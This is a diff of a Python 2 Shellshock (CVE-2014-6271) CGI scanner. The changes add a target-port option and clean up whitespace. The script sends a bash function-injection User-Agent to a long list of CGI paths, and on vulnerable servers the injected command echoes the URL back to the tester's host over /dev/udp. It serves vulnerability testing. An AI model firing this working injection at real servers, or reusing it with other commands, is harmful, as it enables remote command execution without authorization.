@@ -3,9 +3,9 @@
 
 '''This script will attempt to identify possible vulnerable CGI scripts on a server
 
-The test is performed by sending a maliciously crafted User-Agent that will instruct 
+The test is performed by sending a maliciously crafted User-Agent that will instruct
 the vulnerable machine to echo the URL you are testing back to your system on a port of your choice.
- 
+
 ***This requires that the machine you are testing be able to connect back to you;
 either via a local network, Public IP, or NAT***
 
@@ -21,26 +21,27 @@ import threading
 from threading import Thread
 
 def parse_args():
-    p = argparse.ArgumentParser(description='''Shellshock CGI vulnerably test''', 
-    formatter_class=argparse.RawTextHelpFormatter)
+    p = argparse.ArgumentParser(description="Shellshock CGI vulnerably test", formatter_class=argparse.RawTextHelpFormatter)
 
     p.add_argument('-s', '--server', required=True, help="The IP address or URL of the system you are trying to test no leading HTTP://")
     p.add_argument('-l', '--listen', required=True, help="The interface IP address that should listen on your system")
     p.add_argument('-p', '--port', default=4443, type=int, help="The port to listen on for the callback")
-        
+    p.add_argument('-sp', '--sport', default=80, type=int, help="The port on the target server.")
+
     args = p.parse_args()
     return args
-        
-        
-args = parse_args() 
+
+
+args = parse_args()
 host = args.listen
 port = args.port
+server_port = args.sport
 server_clean = args.server
 server = server_clean.replace("http://","")
 server_ip = socket.gethostbyname(server)
 
 
-CGI_Scripts = ['/', 
+CGI_Scripts = ['/',
 '/_mt/mt.cgi',
 '/admin.cgi',
 '/administrator.cgi',
@@ -410,7 +411,7 @@ CGI_Scripts = ['/',
 '/wwwboard.cgi',
 '/cgi-sys/entropysearch.cgi',
 '/cgi-sys/FormMail-clone.cgi',
-'/wwwboard/wwwboard.cgi'] #This is a list of possibly vulnerable CGI scripts. Will add more as I find them. 
+'/wwwboard/wwwboard.cgi'] #This is a list of possibly vulnerable CGI scripts. Will add more as I find them.
 #Most of these paths are from http://shellshock.detectify.com
 def test_socket():
 	try:
@@ -426,7 +427,7 @@ def test_socket():
 	except socket.error:
 		print "Error binding to the socket."
 		sys.exit()
-		
+
 	print '[+] Testing if %s is vulnerable to CVE-2014-6271 via CGI' %(server)
 	print '[+] Listening for incoming connections on the following socket' + " " + str(host) + ":" + str(port)
 
@@ -436,20 +437,20 @@ def test_socket():
 			if respond_server[0] == server_ip: #verify that the server responding is the same as the server we are testing
 				print "[!] The server is vulnerable at the following URI: %s" %(data)
 		except socket.error:
-			# Socket is set to non-blocking. Errors at no-data. 
+			# Socket is set to non-blocking. Errors at no-data.
 			pass
-		
+
 
 def check_vuln():
-	for uri in CGI_Scripts:
-		server_test = "http://"+args.server+str(uri)
-		usr_agent = "() { :;}; /bin/bash -c 'echo %s > /dev/udp/%s/%s'" %(server_test,host,port) #create a custom user-agent. 
+    for uri in CGI_Scripts:
+        server_test = "http://" + args.server + ":" + str(server_port) + str(uri)
+        usr_agent = "() { :;}; /bin/bash -c 'echo %s > /dev/udp/%s/%s'" %(server_test,host,port) #create a custom user-agent.
 		#It echos the URI we are testing back via UDP to the host and port we specified (the machine you are running the code from)
-		try:
-			req = urllib2.Request(server_test, None, {"User-agent" : usr_agent})
-			urllib2.urlopen(req)
-		except urllib2.HTTPError: # a lot of the URLS we test are going to be 404s lets ignore those errors
-			pass
+        try:
+            req = urllib2.Request(server_test, None, {"User-agent" : usr_agent})
+            urllib2.urlopen(req)
+        except urllib2.HTTPError: # a lot of the URLS we test are going to be 404s lets ignore those errors
+            pass
 
 def main():
 	try: # Need to spin up a thread to keep our socket open while we test URLs
@@ -457,12 +458,12 @@ def main():
 		t1.daemon = True
 		t1.start()
 		check_vuln()
-	except KeyboardInterrupt: #want to make sure this is interruptible 
+	except KeyboardInterrupt: #want to make sure this is interruptible
 		t1._Thread__stop()
 		sys.exit()
 	finally:
 		t1._Thread__stop()
 		sys.exit()
-		
+
 if __name__ == "__main__":
 	main()
